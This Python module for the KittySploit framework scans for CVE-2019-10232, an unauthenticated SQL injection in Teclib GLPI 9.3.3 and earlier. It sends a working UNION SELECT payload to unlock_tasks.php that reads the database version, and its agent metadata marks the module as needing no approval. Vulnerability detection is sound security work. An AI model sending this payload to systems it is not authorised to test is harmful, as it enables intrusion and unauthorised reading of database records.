#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Teclib GLPI <= 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Teclib GLPI <= 9.3.3 - Unauthenticated SQL Injection Detection',
        'description': 'Teclib GLPI <= 9.3.3 exposes a script (/scripts/unlock_tasks.php) that incorrectly sanitizes user controlled data before using it in SQL queries. Thus, an attacker could abuse the affected feature to alter the semantic original SQL query and retrieve database records.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'glpi', 'sqli', 'injection', 'teclib-edition', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.synacktiv.com/ressources/advisories/GLPI_9.3.3_SQL_Injection.pdf',
            'https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-10232',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/HimmelAward/Goby_POC',
        ],
        'cve': 'CVE-2019-10232',
    }

    def run(self):
        for path in ('/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1', '/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('-MariaDB-', 'Start unlock script',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='critical',
                    reason="Teclib GLPI <= 9.3.3 - Unauthenticated SQL Injection detected",
                    path=path,
                )
                return True
        return False

